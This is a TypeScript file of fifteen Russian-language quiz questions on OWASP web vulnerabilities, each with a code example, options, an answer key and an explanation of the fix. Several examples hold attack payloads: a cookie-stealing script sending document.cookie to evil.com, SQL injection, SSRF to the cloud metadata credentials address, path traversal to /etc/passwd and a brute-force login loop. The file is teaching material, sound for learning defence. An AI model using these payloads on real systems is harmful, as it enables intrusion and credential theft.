import type { QuizQuestion } from '@/components/ui/QuizBlock/QuizBlock';

export const QUIZ_QUESTIONS: QuizQuestion[] = [
  {
    id: 'owasp-1',
    difficulty: 'easy',
    question: 'Что делает эта SQL-инъекция?',
    code: `// URL: /users?name=' OR '1'='1
const query = "SELECT * FROM users WHERE name = '" + name + "'";
// Итоговый запрос:
// SELECT * FROM users WHERE name = '' OR '1'='1'`,
    options: [
      "Возвращает всех пользователей — условие '1'='1' всегда true",
      'Вызывает синтаксическую ошибку SQL',
      'Возвращает только пользователя с пустым именем',
      'Удаляет всех пользователей через DROP TABLE',
    ],
    correct: 0,
    explanation:
      'WHERE name = \'\' OR \'1\'=\'1\' — условие \'1\'=\'1\' всегда истинно, поэтому возвращаются все строки. Через инъекцию также можно: читать другие таблицы (UNION), извлекать схему (information_schema), выполнять команды ОС (xp_cmdshell в MSSQL).',
  },
  {
    id: 'owasp-2',
    difficulty: 'easy',
    question: 'Как правильно защититься от SQL-инъекции?',
    code: `// Вариант A — конкатенация строк:
"SELECT * FROM users WHERE id = " + userId

// Вариант B — параметризованный запрос:
db.query("SELECT * FROM users WHERE id = $1", [userId])`,
    options: [
      'Только параметризованные запросы (Б) — входные данные не интерпретируются как SQL',
      'Экранировать кавычки в строке (заменить \' на \\\')',
      'Проверить что userId — число через parseInt()',
      'Использовать HTTPS — он шифрует запросы',
    ],
    correct: 0,
    explanation:
      'Параметризованные запросы: БД получает SQL и данные раздельно — данные никогда не интерпретируются как SQL-код. parseInt() не спасёт для строковых параметров. Экранирование — неполная защита, зависит от кодировки. ORM (Sequelize, Prisma) параметризуют автоматически.',
  },
  {
    id: 'owasp-3',
    difficulty: 'medium',
    question: 'Что такое IDOR-уязвимость?',
    code: `// Пользователь с id=99 делает запрос:
GET /api/orders/42   // чужой заказ

// Сервер проверяет только авторизацию,
// но не проверяет принадлежность ресурса`,
    options: [
      'Insecure Direct Object Reference — доступ к чужому ресурсу по его ID без проверки прав',
      'Internal Data Object Request — запрос внутренних объектов БД',
      'Invalid Data Object Response — невалидный ответ API',
      'Indirect Data Object Retrieval — косвенное извлечение данных',
    ],
    correct: 0,
    explanation:
      'IDOR (A01 Broken Access Control): сервер проверяет "ты залогинен?" но не "этот ресурс твой?". Атакующий перебирает ID: /orders/1, /orders/2... Фикс: всегда проверять WHERE id = $1 AND user_id = $2 (текущий пользователь).',
  },
  {
    id: 'owasp-4',
    difficulty: 'medium',
    question: 'Чем Stored XSS опаснее Reflected XSS?',
    code: `// Reflected: атака в URL
// /search?q=<script>alert(1)</script>

// Stored: атака сохранена в БД
// Комментарий: "<script>fetch('evil.com?c='+document.cookie)</script>"`,
    options: [
      'Stored хранится в БД и поражает всех, кто открывает страницу — без клика на ссылку',
      'Reflected более опасен — выполняется в URL без загрузки страницы',
      'Они одинаково опасны — разница только в терминологии',
      'Stored только показывает alert, Reflected может украсть cookie',
    ],
    correct: 0,
    explanation:
      'Stored XSS: вредоносный скрипт сохранён в БД и выполняется у каждого посетителя без специального URL. Классический пример — скрипт в комментарии или профиле. Reflected требует чтобы жертва перешла по специальной ссылке. Stored масштабируется автоматически.',
  },
  {
    id: 'owasp-5',
    difficulty: 'medium',
    question: 'Что такое CSRF и как защититься?',
    code: `// Пользователь залогинен на bank.com
// Открывает evil.com с кодом:
<img src="https://bank.com/transfer?to=hacker&amount=1000">`,
    options: [
      'Браузер автоматически отправляет cookies — нужен CSRF-токен или SameSite=Strict',
      'CSRF невозможен с HTTPS — соединение зашифровано',
      'Нужна авторизация — CSRF работает только с анонимными запросами',
      'img тег не отправляет cookies — только fetch и XMLHttpRequest',
    ],
    correct: 0,
    explanation:
      'CSRF: браузер автоматически прикрепляет cookies к запросам. Атакующий заставляет браузер жертвы выполнить запрос от её имени. Защита: SameSite=Strict/Lax на cookie (браузер не отправит cookie с других доменов), или Double Submit Cookie / CSRF-токен в форме.',
  },
  {
    id: 'owasp-6',
    difficulty: 'easy',
    question: 'Почему нельзя хранить пароли в MD5?',
    code: `// MD5("password123") = "482c811da5d5b4bc6d497ffa98491e38"
// Что не так с этим подходом?`,
    options: [
      'MD5 быстрый — GPU перебирает миллиарды хэшей в секунду, rainbow tables',
      'MD5 слишком длинный для хранения в БД',
      'MD5 не поддерживается всеми базами данных',
      'MD5 возвращает разные значения для одного входа',
    ],
    correct: 0,
    explanation:
      'MD5 — быстрый хэш (разработан для скорости, не для паролей). GPU перебирает >10 млрд MD5/сек. Утечка БД → все пароли раскрыты за часы. bcrypt/Argon2 специально медленные: один хэш ~100 мс. Rainbow tables для MD5 — публично доступны. Используй bcrypt(10) или Argon2id.',
  },
  {
    id: 'owasp-7',
    difficulty: 'hard',
    question: 'Что такое SSRF-атака?',
    code: `// API принимает URL и делает запрос:
POST /api/fetch-url
{ "url": "http://169.254.169.254/metadata/credentials" }
// Это адрес AWS Instance Metadata Service!`,
    options: [
      'Сервер делает запрос на внутренний адрес от имени атакующего — обход файрвола',
      'Клиент делает запрос с чужого сервера через прокси',
      'Подделка Server-Side Redirect через XSS',
      'SQL-инъекция через URL-параметры',
    ],
    correct: 0,
    explanation:
      'SSRF (Server-Side Request Forgery): сервер делает HTTP запрос по указанному атакующим URL. С внешнего IP адрес 169.254.169.254 недоступен, но с самого сервера в AWS — возвращает IAM credentials. Фикс: whitelist URL, блокировать внутренние диапазоны (10.x, 192.168.x, 169.254.x, ::1).',
  },
  {
    id: 'owasp-8',
    difficulty: 'medium',
    question: 'Что такое Mass Assignment уязвимость?',
    code: `// PATCH /users/42
// Body: { "name": "Alice", "role": "admin" }

app.patch('/users/:id', async (req, res) => {
  await db.update('users', req.params.id, req.body); // всё тело!
});`,
    options: [
      'Атакующий передаёт лишние поля (role, isAdmin) и они попадают в БД',
      'Сервер обновляет слишком много записей за один запрос',
      'JSON тело слишком большое — переполнение памяти',
      'Массовое обновление через SQL BULK UPDATE',
    ],
    correct: 0,
    explanation:
      'Mass Assignment: если передавать req.body напрямую в UPDATE/INSERT, атакующий может установить любые поля — role: "admin", isVerified: true, balance: 999999. Фикс: явный allowlist полей — принимай только { name, email }, игнорируй всё остальное.',
  },
  {
    id: 'owasp-9',
    difficulty: 'medium',
    question: 'Что делает заголовок Content-Security-Policy?',
    code: `Content-Security-Policy:
  default-src 'self';
  script-src 'self' cdn.example.com;
  img-src *;
  object-src 'none'`,
    options: [
      'Браузер выполняет JS только из разрешённых источников — блокирует inline XSS',
      'Шифрует HTTP трафик между клиентом и сервером',
      'Ограничивает размер входящих запросов',
      'Запрещает CORS запросы со сторонних доменов',
    ],
    correct: 0,
    explanation:
      'CSP: браузер выполняет только скрипты из разрешённых источников (self + cdn.example.com). Inline <script>alert(1)</script> и eval() блокируются. Это вторая линия защиты от XSS: даже если скрипт попал на страницу, браузер его не запустит без nonce или hash.',
  },
  {
    id: 'owasp-10',
    difficulty: 'hard',
    question: 'Что такое timing attack на проверку пароля?',
    code: `// Уязвимая версия:
if (userPassword === inputPassword) { ... }

// Время проверки зависит от длины совпадающего префикса:
// "abc" vs "abcdef" — быстро (позиция 4 !== )
// "secret" vs "secreX" — чуть медленнее`,
    options: [
      'Атакующий по времени ответа угадывает символы пароля по одному',
      'Атака через переполнение буфера при длинном пароле',
      'Замедление сервера через большое количество запросов',
      'Timing — время жизни токена, не атака на пароль',
    ],
    correct: 0,
    explanation:
      'Timing attack: строковое сравнение === завершается при первом несовпадении — время пропорционально длине совпадающего префикса. Миллионы запросов + статистика → можно угадать символы. Фикс: crypto.timingSafeEqual() — всегда сравнивает все байты за одинаковое время.',
  },
  {
    id: 'owasp-11',
    difficulty: 'easy',
    question: 'Что предотвращает флаг httpOnly на cookie?',
    code: `Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict`,
    options: [
      'Чтение cookie через JavaScript — защита от XSS-кражи сессии',
      'Передачу cookie по HTTP (только HTTPS) — это делает Secure',
      'CSRF атаки — это делает SameSite',
      'Подбор значения cookie — делает длинным и случайным',
    ],
    correct: 0,
    explanation:
      'httpOnly: JS не может прочитать cookie через document.cookie. Даже при XSS-инъекции скрипт не получит доступ к сессионному cookie. Secure: отправляется только по HTTPS. SameSite=Strict: не отправляется с других доменов (CSRF защита). Все три флага нужны вместе.',
  },
  {
    id: 'owasp-12',
    difficulty: 'medium',
    question: 'Что такое Path Traversal (Directory Traversal)?',
    code: `// Сервер отдаёт файлы:
GET /files?name=report.pdf
// → читает ./uploads/report.pdf

// Атака:
GET /files?name=../../../etc/passwd`,
    options: [
      'Атакующий выходит за пределы разрешённой директории через "../" и читает системные файлы',
      'Переход по несуществующему пути возвращает 404',
      'Обход CORS через изменение пути запроса',
      'Атака на маршрутизацию Express через специальные символы',
    ],
    correct: 0,
    explanation:
      '../ поднимается на уровень выше. ../../../etc/passwd выходит из uploads/ и читает /etc/passwd. Фикс: path.resolve() + проверить что результат начинается с разрешённой директории. Или использовать UUID вместо имён файлов, хранить пути в БД.',
  },
  {
    id: 'owasp-13',
    difficulty: 'medium',
    question: 'Какой заголовок защищает от clickjacking?',
    code: `// Атака: сайт встроен в iframe на evil.com
// Поверх прозрачный iframe — пользователь кликает
// думая что кликает на evil.com, а нажимает кнопку на bank.com`,
    options: [
      'X-Frame-Options: DENY или Content-Security-Policy: frame-ancestors \'none\'',
      'X-Content-Type-Options: nosniff',
      'Strict-Transport-Security: max-age=31536000',
      'X-XSS-Protection: 1; mode=block',
    ],
    correct: 0,
    explanation:
      'X-Frame-Options: DENY — браузер не отображает страницу в iframe нигде. SAMEORIGIN — только в iframe того же домена. Современный способ: CSP frame-ancestors \'none\'. Clickjacking — реальная атака: жертва "кликает" кнопку "Перевести деньги" думая что играет в игру.',
  },
  {
    id: 'owasp-14',
    difficulty: 'hard',
    question: 'Зачем нужен rate limiting на API?',
    code: `// Без rate limiting:
for (let i = 0; i < 1000000; i++) {
  fetch('/auth/login', {
    method: 'POST',
    body: JSON.stringify({ email: 'alice@example.com', password: passwords[i] })
  });
}`,
    options: [
      'Защита от brute force, DoS, и credential stuffing атак',
      'Ускорение API — кеширование ответов',
      'Ограничение размера БД',
      'Балансировка нагрузки между серверами',
    ],
    correct: 0,
    explanation:
      'Rate limiting: ограничивает количество запросов в единицу времени. Без него: brute force паролей, credential stuffing (утечка логин+пароль с другого сайта), DoS через дорогие эндпоинты. Реализация: express-rate-limit по IP, Redis для распределённого rate limiting. 429 Too Many Requests.',
  },
  {
    id: 'owasp-15',
    difficulty: 'easy',
    question: 'Какой заголовок принудительно переводит браузер на HTTPS?',
    code: `// Пользователь набирает: http://bank.com
// Может ли атакующий перехватить до редиректа?`,
    options: [
      'Strict-Transport-Security (HSTS) — браузер сразу использует HTTPS, HTTP не пробует',
      'Content-Security-Policy: upgrade-insecure-requests',
      'X-Forwarded-Proto: https',
      'Referrer-Policy: no-referrer',
    ],
    correct: 0,
    explanation:
      'HSTS: после первого HTTPS визита браузер запоминает — больше никогда не идёт по HTTP на этот домен. Защита от SSL stripping. Значение: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload. Без HSTS: первый HTTP запрос уязвим к man-in-the-middle.',
  },
];
